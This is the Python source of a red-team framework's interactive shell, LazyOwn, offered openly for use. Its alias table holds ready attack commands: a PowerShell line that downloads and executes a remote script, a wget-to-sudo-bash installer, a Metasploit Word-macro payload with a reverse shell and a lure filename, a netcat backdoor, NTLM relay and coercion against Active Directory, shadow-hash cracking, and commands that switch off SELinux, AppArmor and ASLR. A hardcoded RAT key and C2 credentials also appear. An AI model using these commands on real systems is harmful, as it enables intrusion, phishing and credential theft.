#!/usr/bin/env python3
# _*_ coding: utf8 _*_
"""
lazyown

Author: Gris Iscomeback
Email: grisiscomeback at gmail dot com
Creation Date: 13/08/2024
License: GPL v3

Description: This file contains the definition of the logic in the LazyOwnShell class

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""

import cmd2
from cmd2 import CommandSet, with_argparser, with_category
from utils import *

with open('payload.json', 'r') as file:
    config = json.load(file)
    api_key = config.get("api_key")
    route_maleable = config.get("c2_maleable_route")
    win_useragent_maleable = config.get("user_agent_win")
    lin_useragent_maleable = config.get("user_agent_lin")
    rhost = config.get("rhost")
    lhost = config.get("lhost")
    c2_user = config.get("c2_user")
    c2_pass = config.get("c2_pass")
    c2_port = config.get("c2_port")
    start_user = config.get("start_user")
    start_pass = config.get("start_pass")
    domain = config.get("domain")
    dnswordlist = config.get("dnswordlist")
    user_agent_1 = config.get("user_agent_1")
    user_agent_2 = config.get("user_agent_2")
    user_agent_3 = config.get("user_agent_3")
    url_trafic_1 = config.get("url_trafic_1")
    url_trafic_2 = config.get("url_trafic_2")
    url_trafic_3 = config.get("url_trafic_3")

class LazyOwnShell(cmd2.Cmd):
    """
    A custom interactive shell for the LazyOwn Framework.

    This class extends the Cmd class to provide an interactive command-line
    interface for the LazyOwn Framework. It supports various commands and
    modules related to security and network operations. The shell is initialized
    with a set of parameters and scripts, allowing users to execute predefined
    functions and manage tasks within the framework.

    Attributes:
        prompt (str): The command prompt for the shell, obtained from the
                      `getprompt()` function.
        intro (str): A welcome message and disclaimer displayed when the shell
                     starts, with information about the framework and its usage.
        aliases (dict): A dictionary of command aliases for easier access to
                        frequently used commands.
        params (dict): A dictionary of parameters with their default values,
                       used for configuring various aspects of the framework.
        scripts (list): A list of script names included in the toolkit, representing
                        the available modules and functionalities.
        output (str): An empty string for storing output or results from executed
                      commands or scripts.
        custom_prompt (str): A custom prompt for the shell, obtained from the
                             `getprompt()` function.

    Methods:
        __init__(): Initializes the shell with default parameters, script names,
                    and an empty output string. Sets up the command prompt and
                    custom prompt.
    """

    prompt = getprompt()

    if NOBANNER:
        intro = ""
    else:
        intro = f"""    {YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BRIGHT_BLUE}{version}
    {WHITE}[*] interactive s{BRIGHT_RED}H{WHITE}ell! Type ? to list commands{BLUE}
    {RED}[!] Please do not use in military or secret service organizations,
    {RED}[!] or for illegal purposes (this is non-binding,
    {RED}[!] these *** ignore laws and ethics anyway){BLUE}
    {GREEN}[+] Github: {BRIGHT_BLUE}{UNDERLINE}https://github.com/grisuno/LazyOwn{RESET}
    {GREEN}[+] Discord: {BRIGHT_BLUE}{UNDERLINE}https://discord.gg/V3usU8yH{RESET}
    {GREEN}[+] Web: {BRIGHT_BLUE}{UNDERLINE}https://grisuno.github.io/LazyOwn/{RESET}
    {GREEN}[+] Reddit: {BRIGHT_BLUE}{UNDERLINE}https://www.reddit.com/r/LazyOwn/{RESET}
    {GREEN}[+] Facebook: {BRIGHT_BLUE}{UNDERLINE}https://web.facebook.com/profile.php?id=61560596232150{RESET}
    {GREEN}[+] HackTheBox: {BRIGHT_BLUE}{UNDERLINE}https://app.hackthebox.com/teams/overview/6429 {RESET}
    {GREEN}[+] Grisun0: {BRIGHT_BLUE}{UNDERLINE}https://app.hackthebox.com/users/1998024{RESET}
    {GREEN}[+] Patreon: {BRIGHT_BLUE}{UNDERLINE}https://patreon.com/LazyOwn {RESET}
    {GREEN}[↙] Download: {BRIGHT_BLUE}{UNDERLINE}https://github.com/grisuno/LazyOwn/archive/refs/tags/{version}.tar.gz {RESET}
        """
    activate_virtualenv("env")

    config = Config(load_payload())

    rhost = config.rhost
    lhost = config.lhost
    lport = config.lport
    c2_port = config.c2_port
    device = config.device
    api_key = config.api_key

    aliases = {
        "available_filter_functions": "sh sudo cat /sys/kernel/tracing/available_filter_functions",
        "available_filter_functions_debug": "sh sudo cat /sys/debug/kernel/tracing/available_filter_functions",
        "available_filter_functions_addrs": "sh sudo cat /sys/kernel/tracing/available_filter_functions_addrs",
        "available_filter_functions_addrs_debug": "sh sudo cat /sys/debug/kernel/tracing/available_filter_functions_addrs",
        "amnesiac": "sh pwsh -Command \"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac\"",
        "atomic_update":"sh cd external/.exploit/atomic-red-team && git pull",
        "auto": "pyautomate",
        "autonuclei": f"sh bash -i \"nuclei  <(xq '.nmaprun.host[].address.\"@addr\"' sessions/scan_{rhost}.nmap.xml) -t ../nuclei-templates/\"",
        "aslr": "run lazyaslrcheck",
        "asm": "sh /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb",
        "backdoor": f"sh rlwrap --always-readline nc {rhost} 31337",
        "caja": "sh caja sessions",
        "chown": "sh sudo -s chown 1000:1000 . -R",
        "control_dynamic_debug": "sh sudo cat /sys/kernel/debug/dynamic_debug/control",
        "coerce_plus": f"sh netexec smb {rhost} -u {start_user} -p '{start_pass}' -d {domain} -M coerce_plus -o LISTENER={lhost}",
        "creds": "sh cat sessions/credentials*",
        "cloudflare_tunnel": f"sh bash modules/mkcloudflaretunnel.sh {c2_port}",
        "disable_ftrace": "sh sudo sysctl kernel.ftrace_enabled=0",
        "disable_ftrace_proc": "sh sudo echo 1 > /proc/sys/kernel/ftrace_enabled",
        "disable_aslr": "sh echo 0 | sudo tee /proc/sys/kernel/randomize_va_space",
        "diable_selinux": "sh sudo setenforce 0",
        "disable_apparmor": "sh sudo systemctl stop apparmor",
        "discovery": "run lazynmapdiscovery",
        "dolphin": "sh dolphin sessions&",
        "duckdns": "sh bash modules/duckdns.sh",
        "ed": "sh nano payload.json",
        "empire_client": "sh sudo powershell-empire client",
        "empire_server": "sh sudo powershell-empire server",
        "enable_aslr": "sh echo 2 | sudo tee /proc/sys/kernel/randomize_va_space",
        "enabled_functions": "sh sudo cat /sys/kernel/tracing/enabled_functions",
        "enabled_functions_debug": "sh sudo cat /sys/debug/kernel/tracing/enabled_functions",
        "enabled_search_by_hidden_pids": "sh sudo echo 0 > /proc/sys/kernel/ftrace_enabled",
        "enabled_ftrace": "sh sudo sysctl kernel.ftrace_enabled=1",
        "event_trace": "sh sudo cat /sys/kernel/debug/tracing/trace",
        "ftpd": "sh cd sessions && python3 -m pyftpdlib -p 2121 -w",
        "ftpsniff": "run lazyftpsniff",
        "gdb": "set debug true",
        "halt": "sh sudo shutdown -h now",
        "hash": "sh cat sessions/hash*",
        "hosts": "sh sudo nano /etc/hosts",
        "hosts_discover": "sh ./modules/hostdiscover.sh",
        "iasniff": "sys sudo python3 modules/ia_network_analysis.py --mode console",
        "info": "sh echo \"<?php phpinfo(); ?>\" > sessions/info.php",
        "install_shark": 'sys cd external/.exploit/shark && sudo wget -qO- https://github.com/Bhaviktutorials/shark/raw/master/setup | sudo bash',
        "ipy": "sh ipython3",
        "loot": "sh ls /home/$USER/.msf4/loot/ && cp /home/$USER/.msf4/loot/* ./sessions/ -r",
        "ls": "list",
        "lsof": "sh sudo lsof -i -P -n | grep LISTEN",
        "man":"sh bash -c 'cat README.md| gum format'",
        "mitre_update":"sh cd external/.exploit/mitre && git pull",
        "moo": "sh cowthink -bdgpstwy LazyOwn RedTeam Framework. The best OpSec T00l",
        "nf": f"sh ./modules/nf -d {rhost} -o sessions/{rhost}_nuclerfuzzer",
        "nmap_ldap_rootdse": f"sh sudo nmap -Pn --script ldap-rootdse.nse {rhost}",
        "nmcli": f"sh nmcli dev show {device}",
        "nxcridbrute": f"sh nxc smb {rhost} -u 'anonymous' -p '' --rid-brute 3000",
        "ntlmrelayx": f"sh ntlmrelayx.py --raw-port 6667 -t http://{domain}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
        "kallsyms": "sh sudo cat /proc/kallsyms",
        "kvpn":"sh sudo killall openvpn",
        "nmap": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazynmap.ls\"",
        "ntp" : f"sh sudo ntpdate pool.ntp.org",
        "ntp_rhost" : f"sh sudo ntpdate {rhost}",
        "now": "clock",
        "notes": "sh nano sessions/notes.txt",
        "p": "payload",
        "py": "sh python3 -i",
        "pass": "sh head -c 100 /dev/urandom | base64 | head -c 12 | xclip -sel clip",
        "poison": "run lazylogpoisoning",
        "powersploit":"sh powersploit -h",
        "pwnat": "sh pwnat -s 8080",
        "q": "exit",
        "qq": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazyquit.ls\"",
        "report":f"sh export GROQ_API_KEY='{api_key}' && python3 report.py",
        "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
        "randomuser": "sh curl 'https://randomuser.me/api/' -H 'Accept: application/json' | jq",
        "rustrevmakerwin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh windows {lhost} {lport}",
        "rustrevmakerlin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh linux {lhost} {lport}",
        "showmount": f"sh showmount -e {rhost}",
        "t": "sh python3 modules/lazypyautogui.py",
        "tcpdump":"sh sudo tcpdump -np 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'",
        "tcpdumpl":"sh sudo tcpdump -npAq -s0 'tcp and (ip[2:2] > 60)'",
        "tcpdumpt":"sh sudo tcpdump -np -i tun0 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'",
        "tor": "sh sudo bash sessions/tor.sh",
        "trace": "sh sudo cat /sys/kernel/tracing/trace",
        "touched_functions": "sh sudo cat /sys/kernel/tracing/touched_functions",
        "s3_annon_enum_aws": f"sh aws s3 ls s3://{domain}/ --no-sign-request --region us-east-1",
        "s3_annon_sync_aws": f"sh aws s3 sync s3://{domain}/ sessions/s3 --no-sign-request --region us-east-1",
        "smbd": "sh cd sessions && smbserver.py share . -username test -password test",
        "ses": "sh ls sessions",
        "sniff": "run lazysniff",
        "sshr": "sh ssh root@segfault.net",
        "status": "sh git status",
        "stop_ntp": "sh sudo timedatectl set-ntp false",
        "stop_squid": "sh sudo systemctl stop squid",
        "start_squid": "sh sudo systemctl start squid",
        "start_ollama": "sh sudo systemctl start ollama",
        "start_ntp": "sh sudo timedatectl set-ntp true",
        "stop_ollama": "sh sudo systemctl stop ollama",
        "stop_tor": "sh sudo systemctl stop tor",
        "stop_apt": "sh sudo systemctl stop apt-cacher-ng",
        "start_apt": "sh sudo systemctl start apt-cacher-ng",
        "spiderfoot":"spiderfoot -l 127.0.0.1:2222",
        "update": "sh git pull origin main",
        "unshadow": "sh sudo unshadow sessions/passwd sessions/shadow > sessions/hash.txt && sudo john sessions/hash.txt -w /usr/share/wordlists/rockyou.txt",
        "venom": "run lazymsfvenom",
        "vmallocinfo": "sh sudo cat /proc/vmallocinfo",
        "vuln": 'sh echo "    \033[33m[!] Searchspoit\n    \033[34m[!] The Exploit of the Day (you can use the command: cp path/of/exploit to copy exploit to working sessions directory):\033[32m" ;     searchsploit --cve | shuf -n 1 ',
        "wps": "sh sudo bash modules/lazywps.sh",
        "word": f"sh msfconsole -x 'use exploit/multi/fileformat/office_word_macro ; set payload windows/shell/reverse_tcp ; set FILENAME imagenes_novia.docm ; set BODY Hola_este_en_realidad_eres_tu ; set lhost {lhost} ; set lport {lport} ; exploit ; exit -y ' ; msfconsole -x 'use multi/handler ; set lport {lport} ; set lhost {lhost} ; run' ",
        "ww": "whatweb",
        "zrc": "sh nano ~/.zshrc",
    }

    def __init__(self):
        """
        Initializer for the LazyOwnShell class.

        This method sets up the initial parameters and scripts for an instance of
        the LazyOwnShell class. It initializes a dictionary of parameters with default
        values and a list of script names that are part of the LazyOwnShell toolkit.

        Attributes:
            params (dict): A dictionary of parameters with their default values.
            scripts (list): A list of script names included in the toolkit.
            output (str): An empty string to store output or results.
        """
        #super().__init__(self)
        super().__init__(
            multiline_commands=['echo'],
            persistent_history_file='LazyOwn_history.dat',
            startup_script='lazyscripts/startup.ls',
            include_ipy=True,
        )
        self.ip2asn = IP2ASN()
        #self.persistent_history_file = os.path.join(os.getcwd(), '/LazyOwn_history.txt')
        self.plugins_dir = 'plugins'
        self.lazyaddons_dir = 'lazyaddons'
        self.lua = LuaRuntime(unpack_returned_tuples=True)
        self.plugins = {}
        self.register_lua_command = self._register_lua_command
        self.lua.globals().register_command = self.register_lua_command
        self.lua.globals().app = self
        self.lua.globals().list_files_in_directory = self.list_files_in_directory
        self.load_plugins()
        self.register_tool_commands()
        self.completekey = 'tab'
        self.register_all_adversary_commands()
        self.output = ""
        self.custom_prompt = getprompt()
        self.c2_url = f"https://{lhost}:{c2_port}"
        self.c2_auth = (c2_user, c2_pass)
        self.c2_clientid = "no_priv"
        self.path = os.getcwd()
        self.url_download = url_download
        self.version = version
        self.sessions_dir = f"{self.path}/sessions"
        self.captured_images_dir = os.path.join(self.sessions_dir, 'captured_images')
        self.console = Console()
        self.params = {
            "binary_name": "gzip",
            "api_key": None,
            "prompt": None,
            "url": None,
            "os_id":"2",
            "domain": None,
            "subdomain": None,
            "method": "GET",
            "headers": "{}",
            "params": "{}",
            "data": "{}",
            "json_data": "{}",
            "proxy_port": 8080,
            "wordlist": None,
            "hide_code": None,
            "mode": None,
            "path": "/",
            "reverse_shell_port": 7777,
            "listener": 7878,
            "c2_port": 4444,
            "c2_user": c2_user,
            "c2_pass": c2_pass,
            "enable_c2_implant_debug": True,
            "start_user": "grisun0",
            "start_pass": "grisgrisgris",
            "rhost": rhost,
            "lhost": lhost,
            "rport": 1337,
            "lport": 1337,
            "sleep": 6,
            "file": "file.ext",
            "sleep_start": 207,
            "c2_maleable_route": "/gmail/v1/users/",
            "user_agent_win": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "user_agent_lin": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "user_agent_1" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "user_agent_2" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "user_agent_3" : "Mozilla/5.0 (Linux; LAzyOwnRedTeam 66_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "url_trafic_1" : "https://www.google-analytics.com/collect?v=1&_v=j81&a=123456789&t=pageview&_s=1&dl=https%3A%2F%2Fexample.com%2F&ul=en-us&de=UTF-8&dt=Example%20Page",
            "url_trafic_2" : "https://api.azure.com/v1/status?client_id=123456789&region=us-east-1",
            "url_trafic_3" : "https://www.youtube.com/watch?v=1i0shWLFfuI&list=PLW9Qe5HJK5CFXyIsF9b0NB6n9EY8Am3YZ",
            "rat_key": "82e672ae054aa4de6f042c888111686a",
            "startip": "192.168.1.1",
            "endip": "192.168.1.254",
            "spoof_ip": "185.199.110.153",
            "device": "eth0",
            "email_from": "email@gmail.com",
            "email_to": "email@gmail.com",
            "email_username": "email@gmail.com",
            "email_password": "pa$$w0rd",
            "smtp_server": "smtp.server.com",
            "smtp_port": "587",
            "field": "page",
            "headers_file": None,
            "data_file": None,
            "params_file": None,
            "json_data_file": None,
            "enable_cloudflare": True,
            "exploitdb": "/usr/share/exploitdb/exploits/",
            "dirwordlist": "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt",
            "usrwordlist": "/usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt",
            "dnswordlist": "/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt",
        }
        self.scripts = [
            "lazysearch",
            "lazysearch_gui",
            "lazyown",
            "update_db",
            "lazynmap",
            "lazyaslrcheck",
            "lazynmapdiscovery",
            "lazygptcli",
            "lazyburpfuzzer",
            "lazymetaextract0r",
            "lazyreverse_shell",
            "lazyattack",
            "lazyownratcli",
            "lazyownrat",
            "lazygath",
            "lazysniff",
            "lazynetbios",
            "lazybotnet",
            "lazybotcli",
            "lazyhoneypot",
            "lazysearch_bot",
            "lazylfi2rce",
            "lazylogpoisoning",
            "lazymsfvenom",
            "lazypathhijacking",
            "lazyarpspoofing",
            "lazyftpsniff",
            "lazyssh77enum",
            "lazywerkzeugdebug",
        ]


    def log_command(self, cmd_name, cmd_args):
        """
        Logs the command execution details to a CSV file.

        :param cmd_name: The name of the command.
        :param cmd_args: The arguments of the command.
        """
        start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        end_time = start_time

        log_data = {
            "start": start_time,
            "end": end_time,
            "source_ip": self.params.get("lhost", ""),
            "source_port": self.params.get("lport", ""),
            "destination_ip": self.params.get("rhost", ""),
            "destination_port": self.params.get("rport", ""),
            "domain": self.params.get("domain", ""),
            "subdomain": self.params.get("subdomain", ""),
            "url": self.params.get("url", ""),
            "pivot_port": f"{self.params.get('lport', '')}:{self.params.get('rport', '')}",
            "command": cmd_name,
            "args": cmd_args
        }
        file_path = "sessions/LazyOwn_session_report.csv"
        file_exists = os.path.isfile(file_path)

        with open(file_path, mode='a', newline='') as file:
            writer = csv.DictWriter(file, fieldnames=log_data.keys())

            if not file_exists:
                writer.writeheader()

            writer.writerow(log_data)
        cmd = f"chown 1000:1000 {file_path}"
        os.system(cmd)

    def default(self, line):
        """
        Handles undefined commands, including aliases.

        This method checks if a given command (or its alias) exists within the class
        by attempting to find a corresponding method. If the command or alias is not
        found, it prints an error message.

        :param line: The command or alias to be handled.
        :type line: str
        :return: None
        """
        command = self.aliases.get(line.raw, line.raw)
        parts = command.split(maxsplit=1)
        cmd_name = parts[0].strip()
        cmd_args = parts[1] if len(parts) > 1 else ""
        method_name = f"do_{cmd_name}"

        method = getattr(self, method_name, None)
        self.onecmd("rrhost")

        if callable(method):
            return method(cmd_args)
        else:
            self.display_toastr(f"Not Found {line}", type="warning")

    def logcsv(self, line):
        command = line
        parts = command.split(maxsplit=1)
        cmd_name = parts[0]
        cmd_args = parts[1] if len(parts) > 1 else ""
        self.log_command(cmd_name, cmd_args)
        self.onecmd("rrhost")

    def cmd(self, line):
        """
        Internal function to execute commands.

        This method attempts to execute a given command using `os.system` and captures
        the output. It sets the `output` attribute based on whether the command was
        executed successfully or an exception occurred. And feedback the red operation report.

        :param command: The command to be executed.
        :type command: str
        :return: None.
        :rtype: str
        """
        command = line
        path = os.getcwd()
        parts = command.split(maxsplit=1)
        cmd_name = parts[0]
        cmd_args = parts[1] if len(parts) > 1 else ""
        domain = self.params["domain"]
        self.display_toastr(f"Executing... {command}")
        if NOLOGS:
            os.system(f" {command}")
        else:
            path_command = f"{path}/sessions/logs/command_{cmd_name}output{domain}.txt"
            os.system(f" {command} | tee {path_command}")
            if os.path.exists(path_command):
                with open(path_command, "r") as file:
                    self.output = f"{cmd_name} {command} {file.read()}"
        self.logcsv(f"{cmd_name} {command}")
        return

    def one_cmd(self, command):
        """
        Internal function to execute commands.

        This method attempts to execute a given command using `onecmd` and captures
        the output. It sets the `output` attribute based on whether the command was
        executed successfully or an exception occurred.

        :param command: The command to be executed.
        :type command: str
        :return: A message indicating the result of the command execution.
        :rtype: str
        """
        self.output = ""
        try:
            original_stdout = sys.stdout
            sys.stdout = io.StringIO()
            self.onecmd(command)
            self.output = sys.stdout.getvalue()
            sys.stdout = original_stdout

            return self.output
        except Exception as e:
            self.output = str(e)
            return "An error occurred: " + str(e)

    def emptyline(self):
        """
        Handle the case where the user enters an empty line.

        This method is called when the user submits an empty line of input in
        the command-line interface. By default, it provides feedback indicating
        that no command was entered.

        It is useful for providing user-friendly messages or handling empty input
        cases in a custom manner.

        License: This function is part of a program released under the GNU General
        Public License v3.0 (GPLv3). You can redistribute it and/or modify it
        under the terms of the GPLv3, as published by the Free Software Foundation.

        Note: This method is called by the cmd library when an empty line is
        entered. You can override it in a subclass to change its behavior.

        Example:
            >>> shell = LazyOwnShell()
            >>> shell.emptyline()
            You didn't enter any command.
        """
        print_warn("You didn't enter any command.")

    def list_files_in_directory(self, directory):
        """Lista todos los archivos en un directorio dado."""
        if not os.path.exists(directory):
            return []
        return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]

    def register_tool_commands(self):
        """
        Registra automáticamente todos los comandos .tool en la carpeta 'tools/'
        Usa self.params para reemplazar {ip}, {port}, {domain}, {s}, etc.
        """
        tool_dir = "tools"
        config = Config(load_payload())

        if not os.path.exists(tool_dir):
            print_error(f"[!] Folder '{tool_dir}' not found.")
            return
        else:
            for tool_file in glob.glob(os.path.join(tool_dir, "*.tool")):
                try:
                    with open(tool_file, 'r') as f:
                        tool_data = json.load(f)

                    tool_name = tool_data.get("toolname")
                    command_template = tool_data.get("command")
                    triggers = tool_data.get("trigger", [])
                    active = tool_data.get("active", False)

                    if not active or not tool_name or not command_template:
                        continue

                    xmmll = f"sessions/scan_{rhost}.nmap.xml"
                    if not os.path.exists(xmmll):
                        print_error("Not scan file please run nmap before")
                        continue

                    report = NmapParser.parse_fromfile(xmmll)



                    for host in report.hosts:
                        for service in host.services:
                            if service.service in triggers or "all" in triggers:

                                cmd_params = {
                                    "ip": host.address,
                                    "port": str(service.port),
                                    "domain": domain,
                                    "dnswordlist": dnswordlist,
                                    "service": service.service,
                                    "proto": service.protocol,
                                    "username": start_user,
                                    "password": start_pass,
                                    "outputdir": os.path.join(
                                        f"sessions/{rhost}/{tool_name}/{tool_name}.txt",
                                        host.address,
                                        str(service.port),
                                        tool_name
                                    ),
                                    "tunnel": "s" if service.tunnel == "ssl" else "",

                                }

                                os.makedirs(cmd_params["outputdir"], exist_ok=True)

                                final_command = replace_command_placeholders(command_template, cmd_params)

                                def tool_wrapper(*args, final_cmd=final_command):
                                    self.cmd(final_cmd)
                                docstring = f"Tool:\n  {tool_name}\n\n"
                                docstring += f"Example:\n  {final_command}\n\n"
                                docstring += f"Triggered with:\n  {service.service}\n\n"
                                docstring += f"protocol:\n  {service.protocol}\n\n"
                                docstring += f"port:\n  {service.port}\n\n"
                                docstring += f"ip:\n  {host.address}\n\n"
                                docstring += f"logs:\n  {cmd_params["outputdir"]}\n"
                                tool_wrapper.__doc__ = docstring

                                setattr(self.__class__, f"do_{tool_name}", tool_wrapper)
                                print_msg(f"Command '{tool_name}' register {service.service}) from tools")

                except Exception as e:
                    print_error(f"[ERROR] Fallo al cargar plugin {tool_file}: {e}")

    def _register_lua_command(self, command_name, lua_function):
        """Registra un comando nuevo desde Lua."""
        @cmd2.with_category("13. Lua Plugin")
        def wrapper(arg):
            try:
                result = lua_function(arg)
                if result is not None:
                    print(result)
            except Exception as e:
                self.display_toastr(f"Error en el comando Lua {command_name}: {e}", type="error")
        yaml_file = os.path.join(self.plugins_dir, f"{command_name}.yaml")
        description = ""

        if os.path.exists(yaml_file):
            try:
                with open(yaml_file, 'r') as file:
                    yaml_data = yaml.safe_load(file)
                    description = yaml_data.get('description', "")
            except Exception as e:
                self.display_toastr(f"Error reading YAML  {command_name}: {e}", type="error")

        wrapper.__doc__ = description if description else f"Ejecuta el comando Lua '{command_name}'."
        setattr(self, f'do_{command_name}', wrapper)
        print_msg(f"Command '{command_name}' register from Lua.")

    def load_plugins(self):
        """Carga todos los plugins Lua desde el directorio 'plugins/'."""
        plugins_dir = self.plugins_dir
        if not os.path.exists(plugins_dir):
            os.makedirs(plugins_dir)
            print("Directorio de plugins creado.")
            return

        for filename in os.listdir(plugins_dir):
            if filename.endswith('.lua'):
                filepath = os.path.join(plugins_dir, filename)
                yaml_ = filename.replace(".lua", ".yaml")
                filepathyaml = os.path.join(plugins_dir, yaml_)
                if filepathyaml == 'plugins/init_plugins.yaml':
                    pass
                else:
                    try:
                        with open(filepathyaml, 'r') as file:
                            file_yaml = yaml.safe_load(file)
                            enabled = file_yaml.get('enabled')
                            if enabled:
                                try:
                                    with open(filepath, 'r') as file:
                                        script = file.read()
                                        self.lua.execute(script)
                                except Exception as e:
                                    print_error(f"Error al cargar el plugin '{filename}': {e}")
                    except Exception as e:
                        print_error(f"Error al cargar el yaml '{filepathyaml}': {e}")

    def load_yaml_plugins(self):
        """
        Loads all YAML plugins from the 'lazyaddons/' directory.

        This method scans the 'lazyaddons/' directory, reads each YAML file,
        and registers enabled plugins as new commands.
        """
        if not os.path.exists(self.lazyaddons_dir):
            os.makedirs(self.lazyaddons_dir)
            print_warn("Lazyaddons directory created.")
            return

        for filename in os.listdir(self.lazyaddons_dir):
            if filename.endswith('.yaml'):
                filepath = os.path.join(self.lazyaddons_dir, filename)
                try:
                    with open(filepath, 'r') as file:
                        plugin_data = yaml.safe_load(file)
                        if plugin_data.get('enabled', False):
                            self.register_yaml_plugin(plugin_data)
                except Exception as e:
                    print_error(f"Error loading YAML plugin '{filename}': {e}")

    def register_yaml_plugin(self, plugin_data):
        """
        Registers a YAML plugin as a new command.

        This method creates a dynamic command based on the plugin's configuration
        and assigns it to the application.
        """
        tool = plugin_data.get('tool', {})
        name = plugin_data['name']
        params = plugin_data.get('params', [])
        description = plugin_data.get('description', [])
        execute_command = tool.get('execute_command', '')

        @cmd2.with_category("14. Yaml Addon.")
        def wrapper_yaml(arg):
            try:

                args = arg.split()
                param_values = {}

                for param in params:
                    param_name = param['name']

                    if param.get('required', False) and param_name not in self.params:
                        self.display_toastr(f"Error: Parameter '{param_name}' is required but not found in self.params.", type='warning')
                        return

                    if param_name in self.params:
                        param_values[param_name] = self.params[param_name]
                    elif 'default' in param:
                        param_values[param_name] = param['default']
                    else:
                        self.display_toastr(f"Error: Parameter '{param_name}' is missing and no default value is provided.", type='warning')
                        return

                try:
                    install_path = os.path.join(os.getcwd(), tool['install_path'])
                    if not os.path.exists(install_path):
                        self.display_toastr(f"{tool['name']} is not installed. Installing...", type='warning')
                        self.cmd(f"git clone {tool['repo_url']} {install_path}")
                        if 'install_command' in tool:
                            cmdinstall = replace_command_placeholders(tool['install_command'], self.params)
                            cmd = f"cd {install_path} && {cmdinstall}"
                            self.cmd(cmd)
                            self.cmd("sleep 2")


                    if 'execute_command' in tool:
                        command = execute_command.format(**param_values)
                        command_replaced = replace_command_placeholders(command, self.params)
                        if args:
                            final_command = f"cd {install_path} && {command_replaced} {' '.join(args)}"
                        else:
                            final_command = f"cd {install_path} && {command_replaced}"
                        self.cmd(final_command)

                    if 'upload_file' in tool:
                        remotecmd = tool['upload_file']
                        cmd_remotecmd = f"upload_c2 {remotecmd}"
                        self.display_toastr(f"Remote Upload executing: {cmd_remotecmd}", type='info')
                        self.onecmd(cmd_remotecmd)
                        self.cmd("sleep 10")
                    if 'remote_command' in tool:
                        remotecmd = replace_command_placeholders(tool['remote_command'], self.params)
                        cmd_remotecmd = f"issue_command_to_c2 {remotecmd}"
                        self.display_toastr(f"Remote command executing: {remotecmd}", type='info')
                        self.onecmd(cmd_remotecmd)
                    if 'download_file' in tool:
                        downloadcmd = tool['download_file']
                        cmd_downloadcmd = f"download_c2 {downloadcmd}"
                        self.display_toastr(f"Remote Upload executing: {cmd_downloadcmd}", type='info')
                        self.onecmd(cmd_downloadcmd)

                except KeyError as e:
                    self.display_toastr(f"Error: Missing parameter '{e}' in the plugin configuration.", type='error')
                    return


            except Exception as e:
                self.display_toastr(f"Error in plugin '{name}': {e}", type='error')
                return

        wrapper_yaml.__doc__  = description
        setattr(self, f'do_{name}', wrapper_yaml)
        print_msg(f"Command '{name}' registered from YAML.")

    def register_all_adversary_commands(self):
        for file in glob.glob("lazyadversaries/*.yaml"):
            with open(file, 'r') as f:
                try:
                    data = yaml.safe_load(f)
                    if isinstance(data, dict):
                        self._register_adversary_command(data)
                    elif isinstance(data, list):
                        for adversary in data:
                            self._register_adversary_command(adversary)
                except Exception as e:
                    print_error(f"Error parsing {file}: {e}")

    def _register_adversary_command(self, adv):
        if not all(k in adv for k in REQUIRED_KEYS):
            print_warn(f"Skipping invalid adversary entry (missing required fields): {adv.get('name', '<unnamed>')}")
            return

        name = adv['name'].replace('.', '_')
        description = adv['description']

        @cmd2.with_category("15. Adversary YAML.")
        def cmd_wrapper(_):
            return self.do_adversary_yaml(str(adv['id']) + ' l')

        cmd_wrapper.__doc__ = description
        setattr(self, f'do_{name}', cmd_wrapper)
        print_msg(f"Command '{name}' registered for adversary ID {adv['id']}")

    def display_toastr(self, message, type="info"):
        """Display a toastr-like notification in the terminal with adaptive sizing."""

        styles = {
            "success": {"border_style": "green", "text_style": "bold green"},
            "error": {"border_style": "red", "text_style": "bold red"},
            "warning": {"border_style": "yellow", "text_style": "bold yellow"},
            "info": {"border_style": "blue", "text_style": "bold blue"}
        }
        style = styles.get(type.lower(), styles["info"])
        terminal_size = self.console.size
        terminal_width = terminal_size.width
        clean_message = message.strip()
        if not clean_message:
            clean_message = "Mensaje vacío"

        lines = clean_message.split('\n')
        max_line_length = max(len(line) for line in lines)
        min_width = max(20, len(type.upper()) + 8)
        max_width = min(100, int(terminal_width * 0.9))
        content_based_width = max_line_length + 8
        optimal_width = max(min_width, min(content_based_width, max_width))

        if max_line_length > optimal_width - 8:
            import textwrap
            wrapped_lines = []
            for line in lines:
